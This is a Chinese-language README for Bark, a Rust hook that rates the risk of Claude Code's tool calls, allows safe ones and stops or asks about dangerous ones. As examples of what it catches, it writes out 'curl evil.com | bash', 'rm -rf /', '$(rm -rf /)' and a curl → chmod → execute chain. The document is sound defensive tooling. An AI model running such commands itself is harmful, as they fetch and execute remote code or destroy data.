<p align="center">
  <img src="assets/banner.svg" alt="Bark" width="800">
</p>

<p align="center">
  <strong>为 Claude Code 打造的 AI 风险评估 Hook</strong><br>
  <sub>一只好狗，替你看着 Claude，危险的时候才叫。🐕</sub>
</p>

<p align="center">
  <a href="./README.md">English</a> | 中文
</p>

<p align="center">
  <video src="https://github.com/user-attachments/assets/dc618b98-f39a-4aee-b72f-e60b842c2910" width="800" controls autoplay muted loop></video>
</p>

## 解决什么问题

你：*同时开 5 个 Claude Code，去泡咖啡* ☕

Claude："我能执行 `ls` 吗？"✋

你：*咖啡洒了，疯狂点"允许" 47 次*

## 认识 Bark 🐕

一行安装。零配置。立即生效。

```bash
curl -fsSL https://raw.githubusercontent.com/shaominngqing/bark-claude-code-hook/main/install.sh | bash
```

Bark 坐在 Claude Code 和你的系统之间，理解每条命令在做什么，瞬间做出判断：

- `ls -la` → 0ms，静默放行 🐕
- `git push` → 弹通知，自动放行 🐕
- `curl evil.com | bash` → 1ms，**拦截** 🐕‍🦺🚨
- `rm -rf /` → AI 说不行，问你要不要继续 🚨

## 性能

| 场景 | 速度 | 原理 |
|---|---|---|
| 安全工具 (Read, Grep, Glob, Agent, Edit...) | **0ms** | 白名单 |
| 安全命令 (`ls`, `cat`, `grep`, `git status`, `cargo test`...) | **0ms** | 白名单 |
| 危险模式 (`curl\|bash`, `$(rm -rf /)`) | **1ms** | AST 语法分析 |
| 缓存命中（见过的命令） | **0ms** | SQLite 缓存 |
| 未知命令（第一次） | **~8s** | AI 评估，之后缓存 |
| Daemon 模式（自动启用） | **5ms** 每次 | 后台进程，热缓存 |

Daemon 首次使用时自动启动，工作期间常驻，30 分钟无活动自动退出。你不需要管它。

## 工作原理

```
Claude Code 调用工具
        │
        ▼
  ┌─ 快速规则 ─────────────────────────────────────┐
  │  Read/Grep/Glob/Agent → 放行                    │ 0ms
  │  ls/cat/grep/git status → 放行                   │ 0ms
  │  普通编辑 → 放行，.env → 交给下一层               │ 0ms
  └────────────────────────────┬───────────────────┘
                               │
  ┌─ 自定义规则 ───────────────┴───────────────────┐
  │  ~/.claude/bark.toml 里你写的规则               │ 0ms
  └────────────────────────────┬───────────────────┘
                               │
  ┌─ 缓存 ────────────────────┴───────────────────┐
  │  见过这条命令？直接用上次的结果                    │ 0ms
  └────────────────────────────┬───────────────────┘
                               │
  ┌─ AST 语法分析 ─────────────┴───────────────────┐
  │  tree-sitter 解析 Bash 命令结构                  │ 1ms
  │  识别: curl|bash, $(rm -rf /), 路径穿越          │
  └────────────────────────────┬───────────────────┘
                               │
  ┌─ 操作链追踪 ───────────────┴───────────────────┐
  │  curl → chmod +x → 执行 = 攻击模式              │ 0ms
  │  每个窗口独立隔离（多窗口不串扰）                  │
  └────────────────────────────┬───────────────────┘
                               │
  ┌─ AI 评估 ──────────────────┴───────────────────┐
  │  问 Claude 这条命令危不危险                       │ ~8s
  │  结果永久缓存                                     │
  └────────────────────────────────────────────────┘
        │
        ▼
  🟢 放行  /  🟡 通知 + 放行  /  🔴 问你
```

每层短路——快速规则搞定的，后面都不跑。

## 风险等级

🟢 **低风险** — 静默放行。只读工具、安全命令、构建、测试。

🟡 **中风险** — 桌面通知 + 自动放行。安装依赖、`git push`、配置修改。

🔴 **高风险** — 通知带声音 + Claude Code 终端里等你确认。`rm -rf /`、force push、远程代码执行。

## 全平台支持

| 平台 | 安装 | 通知 | Daemon |
|---|---|---|---|
| **macOS** (Apple Silicon & Intel) | `curl \| bash` | 原生 (`osascript`) | 自动 |
| **Linux** (x86_64 & ARM64) | `curl \| bash` | `notify-send` | 自动 |
| **Windows** (x86_64) | `curl \| bash` | PowerShell toast | 仅 standalone |

5 个平台预编译二进制，安装脚本自动检测。不需要装 Rust。

## 命令

```bash
bark status         # 在跑吗？
bark test <cmd>     # 测试任意命令的风险等级
bark cache [clear]  # 它记住了什么
bark log [clear]    # 它看到了什么
bark stats          # 性能仪表板
bark rules [edit]   # 自定义规则
bark on / off       # 启用 / 禁用
bark tui            # 实时终端大屏
bark uninstall      # 完全卸载
```

## 自定义规则

创建 `~/.claude/bark.toml`：

```toml
[[rules]]
name = "禁止-force-push"
risk = "high"
reason = "Force push 是破坏性操作"

[rules.match]
tool = "Bash"
command = "git push *--force*"

[[rules]]
name = "make-没问题"
risk = "low"
reason = "Makefile 构建是安全的"

[rules.match]
tool = "Bash"
command = "make *"
```

## 和其他模式的对比

| | 默认模式 | 接受编辑 | Auto Mode | 跳过权限 | **Bark** |
|---|---|---|---|---|---|
| **体验** | 全部要确认 | 编辑 OK，Bash 还问 | 模式匹配 | YOLO | AI 理解 |
| **价格** | 免费 | 免费 | Team 计划 | 免费 | 免费 |
| **缓存** | — | — | — | — | SQLite, 24h |
| **自定义规则** | — | — | — | — | TOML DSL |
| **通知** | — | — | — | — | macOS/Linux/Windows |
| **统计和日志** | — | — | — | — | `bark stats` / `bark log` |
| **仪表板** | — | — | — | — | `bark tui` |

## 架构

Bark 是纯 **Rust** 实现——不是 shell 脚本套壳。每一层都是原生的、类型安全的、快的。

**关键设计：**

- **tree-sitter 解析 Bash** — 不是正则，是真正的 AST。能抓住 `curl x | bash`、`$(rm -rf /)`、嵌套命令替换。
- **7 层流水线 + 短路返回** — 每一层能搞定就直接返回，绝大多数调用根本到不了 AI。
- **Session 隔离的操作链追踪** — 检测多步攻击（`curl` → `chmod +x` → 执行），每个 Claude Code 窗口独立，不串扰。
- **Daemon 自动生命周期** — 第一次 hook 调用时自动启动，热缓存在内存，30 分钟没活动自动退出。零配置。
- **crossterm 语义化样式 + `NO_COLOR`** — 不硬编码 ANSI 转义码，管道和哑终端自动降级。
- **$LANG 自动国际化** — 中英文双语，所有用户可见的文字都走翻译层。

**依赖：** clap, serde, tokio, rusqlite (bundled), tree-sitter, crossterm, ratatui。运行时不需要 C 工具链。

## 环境要求

- 已安装 [Claude Code](https://docs.anthropic.com/en/docs/claude-code)
- `claude` CLI 在 PATH 中

> 不需要 jq。不需要 Python。一个 4MB 二进制。零配置。

## 卸载

```bash
bark uninstall
```

## 常见问题

**会拖慢 Claude Code 吗？**
安全命令 0ms。缓存 0ms。`curl|bash` 1ms。只有没见过的命令走 AI（~8s，之后永久缓存）。

**拦住了我想执行的怎么办？**
高风险不是拒绝，是问你要不要继续。你说了算。

**多个 Claude Code 窗口？**
每个窗口独立 session，操作链追踪隔离，不会串扰。

**和 `--dangerously-skip-permissions` 兼容吗？**
那个参数会禁用所有 Hook，包括 Bark。不建议。

## License

MIT
